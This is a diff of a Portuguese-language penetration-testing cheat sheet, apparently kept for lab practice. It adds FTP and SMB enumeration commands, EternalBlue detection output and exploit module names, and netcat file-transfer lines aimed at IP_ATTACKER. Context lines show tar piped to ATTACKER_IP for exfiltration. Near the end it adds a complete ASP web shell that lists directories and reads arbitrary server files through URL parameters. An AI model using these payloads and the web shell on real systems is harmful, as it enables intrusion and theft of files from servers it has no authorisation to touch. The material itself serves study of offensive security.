@@ -76,8 +76,9 @@ O FTP permite o envio e recebimento de arquivos.
 Em alguns casos o ftp permite o login apenas com o usuário e senha vazia.
 O firewall tende a ser menos restritivo com o modo passivo
 ```
-ftp 192.168.0.8 -P 21
+ftp ftp://usuario:senha@host:2121 # login com credenciais
 
+ftp 192.168.0.8 -P 21
 ftp USER@HOST PORT
 
 
@@ -92,6 +93,11 @@ PASS d3c5t0r3
 ```
 ftp> prompt  # desativa a interação com o servidor
 ftp> mget *  # baixa todos os arquivos
+```
+
+mover um arquivo de diretorio:
+```
+rename arquivo.txt novo_diretorio/arquivo.txt
 ```
 
 **comandos úteis do FTP:**
@@ -128,21 +134,48 @@ Permite o compartilhamento de arquivos/diretórios na rede.
 NetBios (porta 139) --> antigo
 SMB (porta 445) --> mais recente
 
-protocolos aceitos pelo SMB
+Null section e list directory
 ```
-nmap --script smb-protocols -p 445 10.10.11.35 -Pn
+smbclient -L \\\\10.10.11.35\\ -N
+```
+
+enum shared:
+```
+nmap --script smb-enum-shares -p 445 172.16.1.145 -Pn
+crackmapexec smb 172.16.1.145 --shares
+smbclient -L 172.16.1.145 -N
+```
+
+**Vulnerável a EternalBlue (MS17-010):**
+```
+nmap --script smb-protocols -p 445 <HOST> -Pn
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 12:06 EDT
+Nmap scan report for 172.16.1.145 (172.16.1.145)
+Host is up (0.15s latency).
+
 PORT    STATE SERVICE
 445/tcp open  microsoft-ds
 
 Host script results:
 | smb-protocols: 
 |   dialects: 
-|     2.02
-|     2.10
-|     3.00
-|     3.02
-|_    3.11
+|     NT LM 0.12 (SMBv1) [dangerous, but default]    # VULNERAVEL A EternalBlue
+|     2:0:2
+|_    2:1:0
 
+```
+
+modulo para validar a vulnerabilidade ao eternalblue:
+```
+scanner/smb/smb_ms17_010
+
+[+] 172.16.1.145:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1
+
+```
+módulo para exploitar o eternalblue:
+```
+exploit/windows/smb/ms17_010_psexec
+exploit/windows/smb/ms17_010_eternalblue
 ```
 
 estabelece conexão passando usuário e senha
@@ -210,7 +243,7 @@ smbclient -L \\192.168.0.8 --option='client min protocol=NT1' -U admin%admin123
 - **`-U admin%admin123`**: Fornece as credenciais de login para autenticação. O formato `user%password` é usado para passar o nome de usuário e a senha diretamente na linha de comando.
 
 
-Comandos Úteis:
+**Comandos Úteis:**
 ls
 	Descrição: Lista os arquivos e diretórios no diretório atual do servidor SMB.
 get
@@ -789,6 +822,7 @@ winexe -U USER%PASS //HOST cmd.exe
 ```
 
 ```
+sudo crackmapexec smb 172.16.1.145               
 sudo crackmapexec smb hosts.txt -d cicada.htb -u <USER> -p <PASS>
 ```
 
@@ -969,7 +1003,13 @@ python3 -m http.server <PORT>
 
 
 
+# nc/netcat
+transferencia de arquivos via nc:
+```
+nc -lvp PORT > FILE  # receiver
 
+nc IP_ATTACKER PORT_OPPENED < FILE # sender
+```
 # cmd
 transferencia do arquivo rev
 ```
@@ -1442,6 +1482,82 @@ tar cf - minha_pasta | nc ATTACKER_IP 1234
 
 **Firewall:**
 - o firewall pode bloquear reverse shell para portas acima de 1024, neste caso é bom tentarmos realizar reverse shell em portas de serviços web (80/443)
+
+## microsoft iis
+### asp
+https://medium.com/@far00t01/asp-net-microsoft-iis-pentesting-04571fb071a4
+script to directory and file disclosure:
+```
+# ex: http://HOST/file.asp?diretorio=C:\&arquivo=key.txt
+
+<%
+    Dim objFSO, objFolder, objSubfolder, objFile, diretorioAlvo, arquivoAlvo, diretorio, arquivo
+    Dim objTextFile, fileContent
+
+    ' Obtém os parâmetros passados pela URL (diretorio e arquivo)
+    diretorio = Request.QueryString("diretorio")
+    arquivo = Request.QueryString("arquivo")
+
+    ' Se nenhum diretório for passado, define um diretório padrão
+    If diretorio = "" Then
+        diretorioAlvo = "C:\"
+    Else
+        diretorioAlvo = diretorio
+    End If
+
+    ' Se nenhum arquivo for passado, não tenta abrir o arquivo
+    If arquivo = "" Then
+        arquivoAlvo = ""
+    Else
+        arquivoAlvo = diretorioAlvo & "\" & arquivo
+    End If
+
+    ' Criar objeto do sistema de arquivos
+    Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
+
+    ' Verifica se o diretório existe
+    If objFSO.FolderExists(diretorioAlvo) Then
+        Set objFolder = objFSO.GetFolder(diretorioAlvo)
+        
+        Response.Write "<h2>📁 Conteúdo em " & diretorioAlvo & ":</h2><ul>"
+        
+        ' Percorre os subdiretórios
+        For Each objSubfolder In objFolder.SubFolders
+            Response.Write "<li><strong>Diretório:</strong> " & objSubfolder.Name & "</li>"
+        Next
+
+        ' Percorre os arquivos
+        For Each objFile In objFolder.Files
+            Response.Write "<li><strong>Arquivo:</strong> " & objFile.Name & "</li>"
+        Next
+        
+        Response.Write "</ul>"
+
+        ' Se um arquivo foi especificado, tenta abrir e ler o arquivo
+        If arquivoAlvo <> "" Then
+            If objFSO.FileExists(arquivoAlvo) Then
+                Set objTextFile = objFSO.OpenTextFile(arquivoAlvo, 1) ' 1 = ForReading
+                fileContent = objTextFile.ReadAll
+                Response.Write "<h3>📄 Conteúdo do arquivo " & arquivoAlvo & ":</h3>"
+                Response.Write "<pre>" & fileContent & "</pre>"
+                objTextFile.Close
+            Else
+                Response.Write "<p>❌ Arquivo não encontrado: " & arquivoAlvo & "</p>"
+            End If
+        End If
+        
+        ' Fecha o objeto
+        Set objFolder = Nothing
+    Else
+        Response.Write "<p>❌ Diretório não encontrado: " & diretorioAlvo & "</p>"
+    End If
+
+    ' Limpa o objeto
+    Set objFSO = Nothing
+%>
+
+```
+
 ## SQL
 **comandos SQL**
 loga no banco de dados
